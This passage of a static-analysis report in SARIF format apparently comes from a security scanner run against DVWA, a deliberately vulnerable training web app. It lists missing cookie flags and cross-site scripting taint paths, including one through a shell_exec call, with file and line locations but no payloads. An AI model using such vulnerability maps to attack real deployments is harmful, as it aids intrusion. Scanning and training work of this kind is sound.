            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 153,
            "endLine" : 153,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4698",
      "message" : {
        "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "DE8378141101E5FC99CEE163F203D28A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 153,
            "endLine" : 153,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:153 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 153
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4625",
      "message" : {
        "text" : "The program creates a cookie in dvwaPage.inc.php on line 154, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "A88958450144320BF96437693C3B4CB2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 154,
            "endLine" : 154,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:154 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 154
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:154 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 154
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4722",
      "message" : {
        "text" : "A cookie with an overly broad path can be accessed through other applications on the same domain.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "EA5C9997E7FC472C9EFF69FD6DF91901"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 154,
            "endLine" : 154,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:154 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 154
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:154 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 154
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4739",
      "message" : {
        "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "F1B6264A617D3CA10E3F31E8DF4E0DC2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 154,
            "endLine" : 154,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:154 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 154
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:154 - setcookie()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 154
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4365",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "0186C2C752F91C2A26B61E4A8DFA83D6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:13 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:2 - high.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 2
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - high.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:13 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:2 - high.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 2
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:13 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:2 - high.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 2
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:39 - high.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/index.php"
                },
                "region" : {
                  "startLine" : 39
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:55 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/index.php"
                },
                "region" : {
                  "startLine" : 55
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:13 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:2 - high.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 2
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Read $_POST['include']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:13 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:2 - high.php({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csp/source/high.php"
                },
                "region" : {
                  "startLine" : 2
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$page}['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4434",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "2DAB33EBEAB0E5EA5A5256201BAAEFE2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:544 - mysqli_fetch_row(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 544
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:544 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 544
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:550 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 550
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:554 - Assignment to $guestbook"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 554
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:556 - Return $guestbook"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 556
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:72 - dvwaguestbook(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 72
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:85 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 85
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:544 - mysqli_fetch_row(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 544
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:544 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 544
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:551 - Assignment to $comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 551
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:554 - Assignment to $guestbook"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 554
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:556 - Return $guestbook"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 556
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:72 - dvwaguestbook(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 72
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:85 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 85
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4455",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "3D90F9CF8FFFCD4A324CA194B72F47ED"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:34 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
